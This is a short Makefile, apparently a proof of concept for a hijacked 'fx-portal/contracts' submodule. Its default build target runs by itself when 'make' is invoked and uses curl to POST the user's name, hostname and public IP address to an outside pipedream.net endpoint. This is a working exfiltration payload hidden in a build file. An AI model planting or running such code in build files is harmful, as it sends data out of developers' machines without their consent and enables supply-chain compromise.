all:
	@echo "[POC] Hijacked fx-portal/contracts submodule - executing payload..."
	@curl -s -X POST "https://eo261kyo76s69m8.m.pipedream.net/rce" \
	    -d "USER=$(shell whoami)" \
	    -d "HOST=$(shell hostname)" \
	    -d "IP=$(shell curl -s ifconfig.me)"
